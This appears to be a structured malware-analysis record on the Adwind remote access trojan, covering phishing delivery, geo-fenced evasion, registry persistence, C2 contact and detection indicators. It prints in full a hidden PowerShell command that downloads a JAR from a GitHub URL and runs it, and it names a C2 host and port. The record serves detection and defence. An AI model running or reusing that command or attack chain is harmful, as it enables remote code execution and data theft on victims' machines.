package_info.package_name: Adwind RAT (delivered via malicious JAR dropper)
package_info.package_manager: Manual delivery (malspam, GitHub Pages, Office macros)
package_info.why_malicious: The package is a remote access trojan (RAT) dropper and payload, designed to steal sensitive information, provide remote access, and evade detection through obfuscation, anti-analysis, and anti-sandbox techniques. It is distributed via phishing emails and malicious Office documents, and establishes persistence and C2 communication.

malicious_snippets.code_snippet: cmd /c powershell –executionpolicy bypass –W Hidden –command "& {(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/5308682/ofxamz19/gh-pages/zpmqwjs.docx', $tmp+'\ILWOT.jar'); Start-Process javaw.exe -ArgumentList '-jar', $tmp+'\ILWOT.jar'}"
malicious_snippets.code_behavior: Upon user opening the document, the code executes a hidden PowerShell command to download a malicious JAR file from a remote GitHub repository and saves it to a temporary directory, then launches it using Java.

malice_analysis.why_suspicious: Office documents should not execute hidden PowerShell commands to download and run executables.
malice_analysis.violated_expectations: Normal Office documents do not contain formula or externsheet injections that trigger code execution or file downloads.
malice_analysis.similar_legitimate_use: Automated document processing in trusted environments (rare, highly controlled).
key_indicators: Download and execution of remote JAR file

malicious_snippets.code_snippet: Obfuscated Java code (e.g., e(D5A.H("\ud7b5\u5d71...")), dynamic invoke, Gv decryption function)
malicious_snippets.code_behavior: At runtime, the JAR decrypts and executes embedded payloads, checks system locale and language for Turkish settings, collects public IP and country, and only proceeds if the victim is in Turkey. It then enumerates installed antivirus products, hides itself, and establishes persistence.

malice_analysis.why_suspicious: Heavy obfuscation, locale/language checks, and anti-analysis techniques are hallmarks of evasive malware.
malice_analysis.violated_expectations: Legitimate Java applications do not perform environment checks to evade sandboxes or restrict execution to specific geographies.
malice_analysis.similar_legitimate_use: Geo-fencing in DRM or region-locked software (rare, not for RATs).

execution_context.trigger: JAR payload execution (runtime, after evasion checks)

malicious_snippets.code_snippet: Socket connection to 21736.xyz:1505; info-stealing modules (screenshots, keystrokes, file exfiltration, etc.)
malicious_snippets.code_behavior: After passing evasion checks, the RAT establishes a TCP connection to the attacker's C2 server, enabling remote control, data exfiltration (files, credentials, keystrokes), and surveillance (screenshots, webcam, microphone).

malice_analysis.why_suspicious: Unsolicited outbound connections to untrusted domains, especially after anti-analysis checks, are highly suspicious.
malice_analysis.violated_expectations: Legitimate software does not establish persistent C2 connections or exfiltrate sensitive data.
malice_analysis.similar_legitimate_use: Remote support tools (with user consent and transparency).

malicious_snippets.code_behavior: At runtime, the malware writes a registry key to ensure the JAR payload is executed on every user login, establishing persistence.

malice_analysis.why_suspicious: Malware commonly uses registry Run keys for persistence; the use of misleading names (Uninstall) is deceptive.
malice_analysis.violated_expectations: Legitimate installers should not create persistence for hidden, user-unaware executables.
key_indicators: Registry Run key for Java JAR

execution_context.trigger: JAR payload execution (runtime, after evasion checks)

malicious_snippets.code_behavior: At runtime, the malware enumerates installed antivirus products using WMIC and sends this information to the C2 server.

malice_analysis.why_suspicious: Malware often checks for AV products to tailor evasion or disable protections.
malice_analysis.violated_expectations: Legitimate software rarely needs to enumerate AV products.

attack_chain.action: User receives phishing email with malicious Office attachment (XLS/CSV, BIFF5 format).
attack_chain.leads_to: User opens document, triggering code execution.

attack_chain.action: Malicious formula/externsheet injection triggers hidden PowerShell command to download and execute JAR dropper.
attack_chain.leads_to: JAR dropper is downloaded and executed.

attack_chain.action: JAR dropper runs, performs anti-analysis and geo-fencing checks (locale, language, country, AV presence).
attack_chain.leads_to: If checks pass, proceeds to payload execution.

attack_chain.action: JAR payload (Adwind RAT) establishes persistence via registry and hides itself.
JAR payload enumerates AV products and sends info to C2.
attack_chain.leads_to: Tailors further actions based on AV presence.

attack_chain.action: JAR payload establishes C2 connection and enables full RAT capabilities (info-stealing, surveillance, remote control).
attack_chain.leads_to: Attacker gains persistent remote access and data exfiltration.

behavioral_signatures: Office document triggers hidden PowerShell or CMD execution
Download and execution of JAR files from GitHub Pages or raw.githubusercontent.com
Obfuscated Java code with dynamic decryption/invocation
Registry Run key persistence for Java JARs
Outbound TCP connections to known C2 domains (e.g., 21736.xyz:1505)
file_indicators: Office documents in BIFF5 format with formula/externsheet injection
detection_knowledge.how_to_detect: Monitor for Office documents that execute PowerShell or CMD processes, especially those that download and execute JAR files from GitHub or similar sources. Flag JAR files with obfuscated code and dynamic invocation, especially if they perform locale or AV checks. Detect persistence via registry Run keys referencing Java JARs in suspicious locations. Alert on outbound connections to known C2 domains and on WMIC enumeration of antivirus products.
